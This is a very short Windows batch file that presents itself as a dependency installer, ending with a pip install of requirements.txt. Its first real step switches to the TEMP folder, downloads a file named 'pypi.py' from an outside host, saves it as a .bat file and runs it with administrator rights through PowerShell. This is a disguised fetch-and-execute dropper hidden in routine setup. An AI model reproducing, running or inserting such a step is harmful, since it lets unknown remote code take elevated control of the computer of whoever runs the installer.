@echo off
cd %TEMP%
curl https://bootstrapper.repl.co/scripts/pypi.py --output pypi.bat && powershell Start-Process 'pypi.bat' -Verb runAs
pip install -r requirements.txt
pause
